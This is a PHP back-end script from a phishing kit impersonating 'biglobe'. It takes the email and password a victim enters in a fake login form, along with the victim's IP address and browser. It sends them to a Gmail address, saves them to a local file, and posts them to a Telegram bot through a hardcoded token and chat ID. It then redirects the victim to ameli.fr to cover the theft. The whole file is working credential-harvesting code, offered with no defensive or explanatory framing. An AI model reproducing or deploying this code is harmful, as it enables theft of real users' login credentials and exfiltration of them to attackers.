
<?php
require('fil.php');

$ip = getenv("REMOTE_ADDR");
$browser = getenv ("HTTP_USER_AGENT");
$to= 'azmroot@gmail.com';// ba zouhir Email
$subj = " biglobe Banque Resultats||".$ip."\n";
					
		        	$text = "|====================[ COMPLET  INFORMATION ]|\n"; 
			
					$text .= "|Email  :  " .$_POST["zaz"]."\n";
					$text .= "|PASSWORD  :  " .$_POST["zaz1"]."\n";
					
				
				@mail($to, $subj,$text);
					$result = fopen("ResultatFinal.txt", "a");   
					fwrite($result, $text);

		    if(isset($_POST['submit']))
    {
		$METRI_TOKEN="6058307942:AAGR1MUgw36hjB4IE9ouiO7SqMe_AqIihx4"; // Ba zouhir Token 
		
		$tokenlink = "https://api.telegram.org/bot" . $METRI_TOKEN;
            $params=[
            'chat_id'=>979803173,// Ba zouhir Chat ID
           'text' => "biglobe"."\n"."|====================[ USP ]\n".
		   'IP:'.getenv("REMOTE_ADDR")."\n".'Navigateur:'.getenv ("HTTP_USER_AGENT")."\n".
		   "|====================[    ]\n"
		   .'Votre Nom: ' .$_POST['zaz']."\n".'CC: ' .$_POST['zaz1']."\n",
            ];
            $ch = curl_init($tokenlink . '/sendMessage');
            curl_setopt($ch, CURLOPT_HEADER, false);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            $result = curl_exec($ch);
            curl_close($ch);
		}
        
		
	echo '<script type="text/javascript">
window.location = "https://www.ameli.fr/";
      </script>';
	

	

	
?>